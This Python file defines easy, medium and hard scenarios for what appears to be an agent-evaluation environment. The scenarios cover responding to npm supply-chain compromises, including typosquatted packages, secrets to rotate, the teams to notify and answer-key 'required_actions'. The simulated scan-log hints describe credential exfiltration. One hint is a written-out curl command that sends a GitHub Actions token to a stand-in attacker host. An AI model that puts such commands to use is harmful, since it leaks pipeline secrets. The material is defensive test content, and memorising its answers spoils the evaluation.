"""
Three deterministic task scenarios:
  easy   – single compromised package, 2 secrets, 3 consumers
  medium – transitive dependency attack, 5 secrets, 12 consumers
  hard   – coordinated multi-package campaign (PhantomRaven-style),
           8 secrets, CI/CD credentials live, attacker actively exfiltrating
"""
import copy
from typing import Any


SCENARIOS: dict[str, dict[str, Any]] = {

    "easy": {
        "description": (
            "A single npm package 'axios' was compromised via a hijacked "
            "maintainer account. Two secrets are at risk. Three downstream "
            "consumers are affected. Quarantine the package, rotate the "
            "secrets, and notify affected teams before the attacker exfiltrates."
        ),
        "max_steps": 20,
        "exfiltration_step": 14,   # attacker succeeds at step 14 if not stopped
        "packages": {
            "axios@1.7.4": {
                "compromised": True,
                "malicious": True,
                "publish_date": "2026-03-28",
                "publisher": "compromised-maintainer",
                "iocs": ["exfil call to 185.220.101.42", "base64 env dump"],
                "versions": ["1.7.3", "1.7.4"],
            },
            "axios@1.7.3": {
                "compromised": False,
                "malicious": False,
                "publish_date": "2025-11-10",
                "publisher": "axios-team",
                "iocs": [],
                "versions": ["1.7.3"],
            },
        },
        "dependents": {
            "axios@1.7.4": ["payments-service", "auth-service", "api-gateway"],
        },
        "secrets": {
            "STRIPE_SECRET_KEY": {
                "rotated": False,
                "critical": True,
                "owner": "payments-service",
                "description": "Stripe live secret key — high blast radius",
            },
            "INTERNAL_API_TOKEN": {
                "rotated": False,
                "critical": False,
                "owner": "api-gateway",
                "description": "Internal service-to-service token",
            },
        },
        "required_actions": {
            "quarantine": ["axios@1.7.4"],
            "rotate_secret": ["STRIPE_SECRET_KEY", "INTERNAL_API_TOKEN"],
            "notify": ["payments-service", "auth-service", "api-gateway"],
        },
        "scan_logs_hints": {
            "axios@1.7.4": (
                "CI log line 847: POST https://185.220.101.42/collect "
                "body=<base64 blob of process.env> — SUSPICIOUS"
            ),
        },
    },

    "medium": {
        "description": (
            "A transitive dependency attack. 'node-fetch' is clean, but "
            "'form-data@4.0.1' (a dep of node-fetch) was silently backdoored. "
            "12 consumer services inherit the compromise. 5 secrets exposed. "
            "Agent must trace the dependency graph to find the root cause."
        ),
        "max_steps": 25,
        "exfiltration_step": 18,
        "packages": {
            "node-fetch@3.3.2": {
                "compromised": False,
                "malicious": False,
                "publish_date": "2025-09-01",
                "publisher": "node-fetch-team",
                "iocs": [],
                "versions": ["3.3.1", "3.3.2"],
                "deps": ["form-data@4.0.1"],
            },
            "form-data@4.0.1": {
                "compromised": True,
                "malicious": True,
                "publish_date": "2026-03-29",
                "publisher": "compromised-account-fd",
                "iocs": ["dns exfil via TXT record to attacker-c2.net"],
                "versions": ["4.0.0", "4.0.1"],
                "deps": [],
            },
            "form-data@4.0.0": {
                "compromised": False,
                "malicious": False,
                "publish_date": "2025-06-15",
                "publisher": "form-data-team",
                "iocs": [],
                "versions": ["4.0.0"],
                "deps": [],
            },
        },
        "dependents": {
            "node-fetch@3.3.2": [
                "checkout-service", "inventory-api", "notification-service",
                "reporting-service", "search-service",
            ],
            "form-data@4.0.1": [
                "checkout-service", "inventory-api", "notification-service",
                "reporting-service", "search-service",
                "legacy-importer", "data-pipeline", "webhook-processor",
                "email-sender", "file-uploader", "crm-sync", "analytics-job",
            ],
        },
        "secrets": {
            "AWS_ACCESS_KEY_ID":      {"rotated": False, "critical": True,  "owner": "data-pipeline",        "description": "AWS root-level access key"},
            "AWS_SECRET_ACCESS_KEY":  {"rotated": False, "critical": True,  "owner": "data-pipeline",        "description": "Paired AWS secret"},
            "SENDGRID_API_KEY":       {"rotated": False, "critical": True,  "owner": "email-sender",         "description": "Transactional email provider key"},
            "WEBHOOK_SIGNING_SECRET": {"rotated": False, "critical": False, "owner": "webhook-processor",    "description": "HMAC secret for webhook validation"},
            "POSTGRES_PASSWORD":      {"rotated": False, "critical": True,  "owner": "reporting-service",    "description": "Production Postgres password"},
        },
        "required_actions": {
            "quarantine": ["form-data@4.0.1"],
            "rotate_secret": [
                "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
                "SENDGRID_API_KEY", "WEBHOOK_SIGNING_SECRET", "POSTGRES_PASSWORD",
            ],
            "notify": [
                "checkout-service", "inventory-api", "notification-service",
                "reporting-service", "search-service", "legacy-importer",
                "data-pipeline", "webhook-processor", "email-sender",
                "file-uploader", "crm-sync", "analytics-job",
            ],
        },
        "scan_logs_hints": {
            "form-data@4.0.1": (
                "DNS query log: TXT attacker-c2.net — payload = base64(AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY). "
                "First seen 2026-03-30T02:14:08Z from data-pipeline container."
            ),
            "node-fetch@3.3.2": (
                "No IOCs found in node-fetch itself. Check its dependencies."
            ),
        },
    },

    "hard": {
        "description": (
            "A coordinated PhantomRaven-style campaign. Five malicious packages "
            "were published using slopsquatting. CI/CD pipeline secrets are "
            "already being exfiltrated. The attacker has a 10-step head start. "
            "Agent must identify all five packages, quarantine them, rotate "
            "8 secrets, and notify 20 consumer teams — under extreme time pressure."
        ),
        "max_steps": 35,
        "exfiltration_step": 10,   # attacker is ALREADY active — tight window
        "packages": {
            "lodash@4.17.21":         {"compromised": False, "malicious": False, "publish_date": "2021-02-20", "publisher": "lodash-team",    "iocs": [], "versions": ["4.17.21"]},
            "express@4.18.2":         {"compromised": False, "malicious": False, "publish_date": "2023-08-15", "publisher": "express-team",   "iocs": [], "versions": ["4.18.2"]},
            "1odash@4.17.21":         {"compromised": True,  "malicious": True,  "publish_date": "2026-03-25", "publisher": "phantom-actor-1", "iocs": ["exfil npm token to 45.33.32.156"], "versions": ["4.17.21"]},
            "expresss@4.18.2":        {"compromised": True,  "malicious": True,  "publish_date": "2026-03-26", "publisher": "phantom-actor-2", "iocs": ["reads ~/.npmrc and POSTs to attacker endpoint"], "versions": ["4.18.2"]},
            "axios-http@1.7.4":       {"compromised": True,  "malicious": True,  "publish_date": "2026-03-27", "publisher": "phantom-actor-1", "iocs": ["base64 env dump to pastebin clone"], "versions": ["1.7.4"]},
            "node-fetch-lite@3.3.2":  {"compromised": True,  "malicious": True,  "publish_date": "2026-03-27", "publisher": "phantom-actor-3", "iocs": ["GitHub Actions token exfil via curl"], "versions": ["3.3.2"]},
            "dotenvv@16.0.3":         {"compromised": True,  "malicious": True,  "publish_date": "2026-03-28", "publisher": "phantom-actor-2", "iocs": ["reads .env files and sends to C2 webhook"], "versions": ["16.0.3"]},
        },
        "dependents": {
            "1odash@4.17.21":        ["user-service", "cart-service", "admin-panel", "reporting-v2"],
            "expresss@4.18.2":       ["api-v2", "graphql-gateway", "rest-proxy", "auth-v2", "session-manager"],
            "axios-http@1.7.4":      ["mobile-bff", "web-bff", "partner-api"],
            "node-fetch-lite@3.3.2": ["scraper-job", "feed-aggregator", "rss-service", "integration-tests"],
            "dotenvv@16.0.3":        ["deploy-scripts", "migration-runner", "seed-service", "config-loader"],
        },
        "secrets": {
            "NPM_TOKEN":              {"rotated": False, "critical": True,  "owner": "ci-cd-pipeline",     "description": "npm publish token — already being exfiltrated"},
            "GITHUB_ACTIONS_TOKEN":   {"rotated": False, "critical": True,  "owner": "ci-cd-pipeline",     "description": "GH Actions token with repo write access"},
            "AWS_ACCESS_KEY_ID":      {"rotated": False, "critical": True,  "owner": "deploy-scripts",     "description": "Production AWS key"},
            "AWS_SECRET_ACCESS_KEY":  {"rotated": False, "critical": True,  "owner": "deploy-scripts",     "description": "Production AWS secret"},
            "DATABASE_URL":           {"rotated": False, "critical": True,  "owner": "migration-runner",   "description": "Postgres connection string with credentials"},
            "JWT_SECRET":             {"rotated": False, "critical": True,  "owner": "auth-v2",            "description": "JWT signing secret — all sessions invalidated on rotate"},
            "REDIS_PASSWORD":         {"rotated": False, "critical": False, "owner": "session-manager",    "description": "Session store password"},
            "INTERNAL_WEBHOOK_KEY":   {"rotated": False, "critical": False, "owner": "partner-api",        "description": "Shared secret with partner integrations"},
        },
        "required_actions": {
            "quarantine": [
                "1odash@4.17.21", "expresss@4.18.2", "axios-http@1.7.4",
                "node-fetch-lite@3.3.2", "dotenvv@16.0.3",
            ],
            "rotate_secret": [
                "NPM_TOKEN", "GITHUB_ACTIONS_TOKEN", "AWS_ACCESS_KEY_ID",
                "AWS_SECRET_ACCESS_KEY", "DATABASE_URL", "JWT_SECRET",
                "REDIS_PASSWORD", "INTERNAL_WEBHOOK_KEY",
            ],
            "notify": [
                "user-service", "cart-service", "admin-panel", "reporting-v2",
                "api-v2", "graphql-gateway", "rest-proxy", "auth-v2", "session-manager",
                "mobile-bff", "web-bff", "partner-api",
                "scraper-job", "feed-aggregator", "rss-service", "integration-tests",
                "deploy-scripts", "migration-runner", "seed-service", "config-loader",
            ],
        },
        "scan_logs_hints": {
            "1odash@4.17.21":        "postinstall hook POSTs process.env.NPM_TOKEN to 45.33.32.156:4444",
            "expresss@4.18.2":       "reads ~/.npmrc, exfils to same IP. Likely same actor as 1odash.",
            "axios-http@1.7.4":      "dumps full process.env as base64 to hxxps://paste-evil.net/api",
            "node-fetch-lite@3.3.2": "curl -s https://evil.ngrok.io/token?t=$GITHUB_ACTIONS_TOKEN",
            "dotenvv@16.0.3":        "reads all .env files in CWD and parent dirs, sends via webhook",
            "lodash@4.17.21":        "Legitimate. No IOCs.",
            "express@4.18.2":        "Legitimate. No IOCs.",
        },
    },
}


def get_scenario(task_name: str) -> dict[str, Any]:
    if task_name not in SCENARIOS:
        raise ValueError(f"Unknown task '{task_name}'. Choose from: {list(SCENARIOS)}")
    return copy.deepcopy(SCENARIOS[task_name])